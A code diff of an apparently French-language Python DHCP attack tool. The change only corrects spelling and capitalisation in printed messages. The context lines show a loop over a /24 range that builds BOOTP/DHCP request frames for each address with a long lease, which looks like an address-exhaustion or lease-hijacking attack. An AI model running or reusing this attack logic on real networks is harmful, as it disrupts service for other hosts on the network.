@@ -35,16 +35,16 @@ def dhcp(interface,win,pg):
     # À chaque tour de boucle nous ajoutons "1" au dernier octet de l'IP puis nous reconstruisons l'IP avec les "." à partir de la liste
     for j in range(0, 256):
         if(liste[0]=="0"):
-            print("L'adresse utiliser n'est pas disponible")
+            print("L'adresse utilisée n'est pas disponible")
             return
         elif(liste[0]=="127"):
-            print("L'adresse utiliser n'est pas disponible")
+            print("L'adresse utilisée n'est pas disponible")
             return
         liste = ip.split(".")
         liste.pop(3)
         str_vide = ""
         new = ip_str + str_vide + "." + str(j)
-        print("Attaque en cours sur l'ip " + new)
+        print("Attaque en cours sur l'IP " + new)
         pg.step(0.39) # Ajout de 0.39 à  la barre de progression
         win.update() # Mise a jour de la fenetre
         # Création de la couche 4 du paquets avec comme adresse de destination l'IP générée dans la boucle
@@ -88,17 +88,17 @@ def dhcp_no_gui(interface):
     # À chaque tour de boucle nous ajoutons "1" au dernier octet de l'IP puis nous reconstruisons l'IP avec les "." à partir de la liste
     for j in range(0, 256):
         if(liste[0]=="0"):
-            print("L'adresse utiliser n'est pas disponible")
+            print("L'adresse utilisée n'est pas disponible")
             return
         elif(liste[0]=="127"):
-            print("L'adresse utiliser n'est pas disponible")
+            print("L'adresse utilisée n'est pas disponible")
             return
         utils.pg()
         liste = ip.split(".")
         liste.pop(3)
         str_vide = ""
         new = ip_str + str_vide + "." + str(j)
-        print("Attaque en cours sur l'ip " + new)
+        print("Attaque en cours sur l'IP " + new)
         # Création de la couche 4 du paquets avec comme adresse de destination l'IP générée dans la boucle
         frame_release_l4 = BOOTP(ciaddr=new, xid=RandInt())
         # Création du message DHCP avec un type de message "request", ainsi qu'un "lease time" correspondant au temps où l'IP ne peut pas être redistribuée, ici, à 100 000 secondes
